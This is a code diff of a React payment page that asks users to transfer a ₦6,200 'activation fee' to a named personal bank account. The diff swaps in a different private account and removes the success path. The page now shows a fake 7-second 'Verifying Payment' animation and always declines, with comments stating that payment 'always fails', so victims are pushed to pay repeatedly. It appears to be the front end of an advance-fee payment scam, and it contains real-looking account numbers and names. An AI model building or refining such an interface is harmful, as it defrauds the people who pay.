@@ -1,7 +1,7 @@
 
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowLeft, Copy, Wallet, User2, Banknote, CheckCircle } from "lucide-react";
+import { ArrowLeft, Copy, Wallet, User2, Banknote, XCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
 import { useAuth } from "@/contexts/AuthContext";
@@ -14,25 +14,18 @@ import OpayWarningModal from "@/components/OpayWarningModal";
 const BankTransferPayment: React.FC = () => {
   const navigate = useNavigate();
   const [isLoading, setIsLoading] = useState(true);
-  const { user, updateUserInfo } = useAuth();
+  const { user } = useAuth();
   const [timeLeft, setTimeLeft] = useState(1800); // 30 mins in seconds
-  const [showProcessingDialog, setShowProcessingDialog] = useState(false);
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [showDeclineDialog, setShowDeclineDialog] = useState(false);
   const [showOpayWarning, setShowOpayWarning] = useState(false);
   const [buttonText, setButtonText] = useState("I Have Made Payment");
-  const [activationCode, setActivationCode] = useState("");
   const [loadingProgress, setLoadingProgress] = useState(0);
   
   const accountDetails = {
-    bankName: "FCMB Bank",
-    accountNumber: "1030512463",
-    accountName: "SAMUEL JUDE",
+    bankName: "Moniepoint MFB",
+    accountNumber: "6056570413",
+    accountName: "CHUKWUEMEKA AMADI JAMES",
     amount: "₦6,200"
-  };
-  
-  // Generate 6-digit activation code
-  const generateActivationCode = () => {
-    return Math.floor(100000 + Math.random() * 900000).toString();
   };
   
   // Load account details with delay
@@ -78,9 +71,9 @@ const BankTransferPayment: React.FC = () => {
   };
 
   const handlePaymentConfirmation = () => {
-    // Show processing dialog with 7-second loading
-    setShowProcessingDialog(true);
-    setButtonText("Pending....");
+    // Show processing dialog with 7-second loading, then always decline
+    setShowDeclineDialog(true);
+    setButtonText("Processing....");
     setLoadingProgress(0);
     
     // Update progress every 100ms for 7 seconds
@@ -94,41 +87,17 @@ const BankTransferPayment: React.FC = () => {
       });
     }, 100);
     
-    // After 7 seconds, show success and generate activation code
+    // After 7 seconds, always show decline
     setTimeout(() => {
-      const newActivationCode = generateActivationCode();
-      setActivationCode(newActivationCode);
-      
-      // Debit user account and activate
-      if (user) {
-        const newBalance = user.balance - 6200;
-        updateUserInfo({ 
-          isActivated: true,
-          balance: newBalance 
-        });
-        
-        // Add transaction to history
-        const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
-        const newTransaction = {
-          id: `tr-${Date.now()}`,
-          type: "debit",
-          amount: 6200,
-          date: new Date().toISOString().split('T')[0],
-          description: "Account Activation Fee",
-          status: "completed"
-        };
-        localStorage.setItem('transactions', JSON.stringify([newTransaction, ...existingTransactions]));
-      }
-      
-      setShowProcessingDialog(false);
-      setShowSuccessDialog(true);
-      toast.success("Payment confirmed! Account activated!");
+      // Payment always fails - no changes to user account
+      toast.error("Payment declined! Please try again later.");
+      setButtonText("I Have Made Payment");
     }, 7000);
   };
 
-  const handleGoToDashboard = () => {
-    setShowSuccessDialog(false);
-    navigate("/dashboard");
+  const handleCloseDeclline = () => {
+    setShowDeclineDialog(false);
+    setLoadingProgress(0);
   };
 
   return (
@@ -241,7 +210,7 @@ const BankTransferPayment: React.FC = () => {
             <button
               onClick={handlePaymentConfirmation}
               className="w-full bg-green-800 text-white py-3 rounded-lg mt-4 text-base font-medium"
-              disabled={showProcessingDialog}
+              disabled={showDeclineDialog}
             >
               {buttonText}
             </button>
@@ -249,57 +218,42 @@ const BankTransferPayment: React.FC = () => {
         )}
       </div>
 
-      {/* Processing Dialog with 7-second loading - Full page overlay */}
-      <Dialog open={showProcessingDialog} onOpenChange={setShowProcessingDialog}>
+      {/* Processing Dialog with decline - Full page overlay */}
+      <Dialog open={showDeclineDialog} onOpenChange={handleCloseDeclline}>
         <DialogContent className="sm:max-w-md p-0 gap-0">
           <div className="p-8">
             <h2 className="text-2xl font-bold text-center mb-8">Payment Processing</h2>
             <div className="flex flex-col items-center justify-center">
-              <div className="w-24 h-24 rounded-full border-4 border-gray-200 mb-6 relative">
-                <div 
-                  className="absolute inset-0 rounded-full border-4 border-green-800 border-t-transparent animate-spin"
-                  style={{ 
-                    transform: `rotate(${(loadingProgress / 100) * 360}deg)`
-                  }}
-                ></div>
-                <div className="absolute inset-2 bg-green-800 rounded-full flex items-center justify-center">
-                  <span className="text-white text-sm font-bold">{Math.round(loadingProgress)}%</span>
-                </div>
-              </div>
-              <p className="text-gray-500 text-lg">Verifying Payment...</p>
+              {loadingProgress < 100 ? (
+                <>
+                  <div className="w-24 h-24 rounded-full border-4 border-gray-200 mb-6 relative">
+                    <div 
+                      className="absolute inset-0 rounded-full border-4 border-green-800 border-t-transparent animate-spin"
+                    ></div>
+                    <div className="absolute inset-2 bg-green-800 rounded-full flex items-center justify-center">
+                      <span className="text-white text-sm font-bold">{Math.round(loadingProgress)}%</span>
+                    </div>
+                  </div>
+                  <p className="text-gray-500 text-lg">Verifying Payment...</p>
+                </>
+              ) : (
+                <>
+                  <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mb-6">
+                    <XCircle size={40} className="text-red-600" />
+                  </div>
+                  <h3 className="text-xl font-bold text-red-600 mb-2">Payment Declined</h3>
+                  <p className="text-gray-600 text-center mb-6">
+                    Your payment could not be processed at this time. Please try again later or contact support.
+                  </p>
+                  <button
+                    onClick={handleCloseDeclline}
+                    className="w-full bg-red-600 text-white py-3 rounded-lg font-medium"
+                  >
+                    Try Again
+                  </button>
+                </>
+              )}
             </div>
-          </div>
-        </DialogContent>
-      </Dialog>
-      
-      {/* Payment Success Dialog */}
-      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-        <DialogContent className="sm:max-w-md p-0 gap-0">
-          <div className="p-8">
-            <div className="flex flex-col items-center mb-6">
-              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
-                <CheckCircle size={40} className="text-green-600" />
-              </div>
-              <h2 className="text-2xl font-bold text-center text-green-800">Payment Confirmed!</h2>
-              <p className="text-center text-gray-600 mt-3">Your account has been activated</p>
-            </div>
-            
-            <div className="bg-gray-50 p-6 rounded-lg mb-6">
-              <p className="text-sm text-gray-600 text-center mb-3">Your Activation Code</p>
-              <div className="flex justify-center">
-                <span className="text-3xl font-bold text-green-800 bg-white px-6 py-3 rounded border tracking-wider">
-                  {activationCode}
-                </span>
-              </div>
-              <p className="text-xs text-gray-500 text-center mt-3">Save this code for your records</p>
-            </div>
-            
-            <button
-              onClick={handleGoToDashboard}
-              className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
-            >
-              Go to Dashboard
-            </button>
           </div>
         </DialogContent>
       </Dialog>
